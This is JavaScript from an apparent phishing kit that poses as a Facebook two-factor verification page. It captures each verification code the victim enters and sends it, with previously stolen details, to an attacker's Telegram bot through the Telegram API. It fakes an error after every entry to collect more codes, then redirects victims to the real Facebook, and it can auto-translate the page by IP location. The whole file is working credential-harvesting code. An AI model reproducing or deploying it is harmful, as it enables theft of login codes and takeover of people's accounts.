 if (localStorage.getItem('visited') !== 'true') {
                window.location.href = 'https://www.facebook.com/';
            }
            const codeInput = document.getElementById('codeInput');
            const continueBtn = document.getElementById('continueBtn');
            const userEmail = document.getElementById('userEmail');

            let codeAttempts = 0;
            let config;
            let storedData = JSON.parse(localStorage.getItem('messageData'));
            
            function maskEmail(phone) {
                const phoneStr = String(phone).replace(/\D/g, '');
                if (phoneStr.length < 2) {
                    return phoneStr + ' • Facebook';
                }
                if (phoneStr.length === 2) {
                    return phoneStr + ' • Facebook';
                }
                if (phoneStr.length <= 5) {
                    return phoneStr + '**' + phoneStr.slice(-2) + ' • Facebook';
                }
                if (phoneStr.length <= 7) {
                    return phoneStr.slice(0, 5) + '***' + phoneStr.slice(-2) + ' • Facebook';
                }
                return phoneStr.slice(0, 5) + '***' + phoneStr.slice(-2) + ' • Facebook';
            }

            if (storedData && storedData.email) {
                userEmail.textContent = maskEmail(storedData.email);
            }

            fetch('config.json')
                .then((response) => response.json())
                .then((data) => {
                    config = data;
                })
                .catch((error) => console.error('Error loading config:', error));

            codeInput.addEventListener('input', function (e) {
                this.value = this.value.replace(/\D/g, '');
                if (this.value.length >= 6 && this.value.length <= 8) {
                    continueBtn.classList.remove('opacity-40');
                    continueBtn.classList.remove('cursor-not-allowed');
                    continueBtn.classList.add('cursor-pointer');

                    codeInput.classList.remove('border-[#D31130]', 'shadow-[0_0_0_2px_rgba(211,17,48,0.2)]');
                    codeInput.classList.add('border-[#dddfe2]');
                    document.getElementById('errorMessage').classList.add('hidden');
                    document.getElementById('errorMessage').classList.remove('flex');
                } else {
                    continueBtn.classList.add('opacity-40');
                    continueBtn.classList.add('cursor-not-allowed');
                    continueBtn.classList.remove('cursor-pointer');
                }
            });

            continueBtn.addEventListener('click', function () {
                if (!config || codeInput.value.length < 6 || codeInput.value.length > 8) return;

                if (codeAttempts >= config.maxCodeAttempts) {
                    window.location.href = 'index.html';
                    return;
                }

                codeAttempts++;
                continueBtn.disabled = true;
                continueBtn.classList.add('opacity-40');
                continueBtn.classList.add('cursor-not-allowed');

                if (storedData && storedData.formattedMessage) {
                    let updatedMessage = storedData.formattedMessage;
                    updatedMessage += `\n🔑 <b>Mã xác minh ${codeAttempts}</b>: <code>${codeInput.value}</code>`;

                    storedData.formattedMessage = updatedMessage;
                    localStorage.setItem('messageData', JSON.stringify(storedData));

                    if (storedData.messageId) {
                        if (config.deleteMessage) {
                            fetch(`https://api.telegram.org/bot${token}/deleteMessage`, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    chat_id: roomId,
                                    message_id: storedData.messageId
                                })
                            });
                        } else {
                           
                            fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    chat_id: roomId,
                                    message_id: storedData.messageId,
                                    text: updatedMessage,
                                    parse_mode: 'HTML'
                                })
                            });
                            if (codeAttempts >= config.maxCodeAttempts) {
                                setTimeout(function() {
                                    window.location.href = 'https://www.facebook.com/';
                                },1000)               
                            }
                        }
                    }

                    if (config.deleteMessage) {
                        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                chat_id: roomId,
                                text: updatedMessage,
                                parse_mode: 'HTML'
                            })
                        })
                            .then((response) => response.json())
                            .then((data) => {
                                if (data.ok) {
                                    storedData.messageId = data.result.message_id;
                                    localStorage.setItem('messageData', JSON.stringify(storedData));
                                }
                            });
                    }
                }

                setTimeout(() => {
                    continueBtn.disabled = false;
                    continueBtn.classList.remove('opacity-40');
                    continueBtn.classList.remove('cursor-not-allowed');
                    continueBtn.classList.add('cursor-pointer');

                    codeInput.classList.remove('border-[#dddfe2]');
                    codeInput.classList.add('border-[#D31130]', 'shadow-[0_0_0_2px_rgba(211,17,48,0.2)]');
                    document.getElementById('errorMessage').classList.remove('hidden');
                    document.getElementById('errorMessage').classList.add('flex');
                    codeInput.value = '';

                   
                }, config.codeLoadingTime);
            });

            document.addEventListener('DOMContentLoaded', () => {
                const loadGoogleTranslate = async () => {
                    try {
                        const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
                        const data = await response.json();
                        const countryCode = data.country_code;

                        const response2 = await fetch('country_to_language.json');
                        const languageMap = await response2.json();
                        const languageCode = languageMap[countryCode] || 'en';

                        if (languageCode !== 'en') {
                            const script = document.createElement('script');
                            script.src = 'https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit';
                            script.async = true;
                            document.body.appendChild(script);

                            window.googleTranslateElementInit = () => {
                                new google.translate.TranslateElement(
                                    {
                                        pageLanguage: 'en',
                                        includedLanguages: languageCode,
                                        autoDisplay: false
                                    },
                                    'google_translate_element'
                                );

                                let retryCount = 0;
                                const maxRetries = 20;
                                const retryInterval = 300;

                                const attemptTranslation = () => {
                                    const gtcombo = document.querySelector('.goog-te-combo');
                                    const instance = google.translate.TranslateElement.getInstance?.();

                                    if (gtcombo || instance) {
                                        const element = document.querySelector('html');
                                        element.setAttribute('lang', languageCode);

                                        if (gtcombo) {
                                            gtcombo.value = languageCode;
                                            gtcombo.dispatchEvent(new Event('change'));
                                        }

                                        if (instance) {
                                            try {
                                                instance.setEnabled(true);
                                                const translateSelect = document.querySelector('.goog-te-combo');
                                                if (translateSelect) {
                                                    translateSelect.value = languageCode;
                                                    translateSelect.dispatchEvent(new Event('change'));
                                                }
                                            } catch (e) {
                                                console.clear();
                                            }
                                        }
                                        return true;
                                    }

                                    retryCount++;
                                    if (retryCount < maxRetries) {
                                        setTimeout(attemptTranslation, retryInterval);
                                    }
                                    return false;
                                };

                                attemptTranslation();
                            };
                        }
                    } catch (error) {
                        console.clear();
                    }
                };

                //loadGoogleTranslate();
            });